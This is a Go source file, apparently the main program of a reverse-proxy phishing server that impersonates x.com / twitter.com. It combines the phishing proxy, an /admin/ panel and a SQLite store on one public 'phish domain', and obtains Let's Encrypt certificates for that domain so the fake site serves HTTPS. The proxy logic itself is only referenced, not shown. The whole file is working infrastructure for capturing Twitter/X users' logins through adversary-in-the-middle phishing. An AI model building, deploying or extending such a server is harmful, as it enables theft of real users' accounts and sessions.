package main

import (
	"context"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"golang.org/x/crypto/acme/autocert"
)

func main() {
	cfg := parseConfig()
	store := newStore(cfg.dataDir)

	px := newProxy(cfg, store)
	adminSrv := newAdmin(cfg, store)

	// rootHandler serves the admin panel under /admin/ and forwards everything
	// else to the phishing proxy. This lets the panel share the same container,
	// public domain, and SQLite DB as the proxy — no separate service or port.
	rootHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/admin" {
			// Redirect to the trailing-slash form so relative URLs in the panel
			// (and the login form action) always resolve under /admin/ rather
			// than against the proxy's "/".
			http.Redirect(w, r, "/admin/", http.StatusMovedPermanently)
			return
		}
		if strings.HasPrefix(r.URL.Path, "/admin/") {
			adminSrv.prefixed("/admin").ServeHTTP(w, r)
			return
		}
		px.ServeHTTP(w, r)
	})

	addr := cfg.listenAddr
	var server *http.Server
	var errCh = make(chan error, 1)

	if cfg.useAutocert {
		log.Printf("using Let's Encrypt autocert for domain %s", cfg.phishDomain)
		m := &autocert.Manager{
			Prompt:     autocert.AcceptTOS,
			HostPolicy: autocert.HostWhitelist(cfg.phishDomain),
			Cache:      autocert.DirCache(cfg.dataDir + "/certs"),
		}
		server = &http.Server{
			Addr:      ":443",
			Handler:   rootHandler,
			TLSConfig: m.TLSConfig(),
		}
		go func() {
			hs := &http.Server{
				Addr:    ":80",
				Handler: m.HTTPHandler(rootHandler),
			}
			errCh <- hs.ListenAndServe()
		}()
		go func() { errCh <- server.ListenAndServeTLS("", "") }()
	} else if cfg.certFile != "" && cfg.keyFile != "" {
		log.Printf("TLS termination using cert=%s key=%s", cfg.certFile, cfg.keyFile)
		server = &http.Server{Addr: addr, Handler: rootHandler}
		go func() { errCh <- server.ListenAndServeTLS(cfg.certFile, cfg.keyFile) }()
	} else {
		log.Printf("WARNING: running without TLS. Set -cert/-key or -autocert for production.")
		server = &http.Server{Addr: addr, Handler: rootHandler}
		go func() { errCh <- server.ListenAndServe() }()
	}

	log.Printf("phishing proxy for %s -> x.com / twitter.com (phish domain: %s)",
		addr, cfg.phishDomain)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	select {
	case err := <-errCh:
		if err != nil && err != http.ErrServerClosed {
			log.Fatalf("server error: %v", err)
		}
	case <-ctx.Done():
	}

	log.Println("shutting down...")
	shutdownCtx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if server != nil {
		_ = server.Shutdown(shutdownCtx)
	}
}

func envOr(key, def string) string {
	if v := strings.TrimSpace(os.Getenv(key)); v != "" {
		return v
	}
	return def
}

// remoteIP extracts the client IP, honoring X-Forwarded-For.
func remoteIP(req *http.Request) string {
	if ip := req.Header.Get("X-Forwarded-For"); ip != "" {
		parts := strings.Split(ip, ",")
		return strings.TrimSpace(parts[0])
	}
	if ip := req.Header.Get("X-Real-IP"); ip != "" {
		return ip
	}
	host, _, err := splitHostPort(req.RemoteAddr)
	if err != nil {
		return req.RemoteAddr
	}
	return host
}

// forwardedProto returns "https" if the request appears TLS-terminated.
func forwardedProto(req *http.Request) string {
	if req.TLS != nil {
		return "https"
	}
	if proto := req.Header.Get("X-Forwarded-Proto"); proto != "" {
		return proto
	}
	return "http"
}
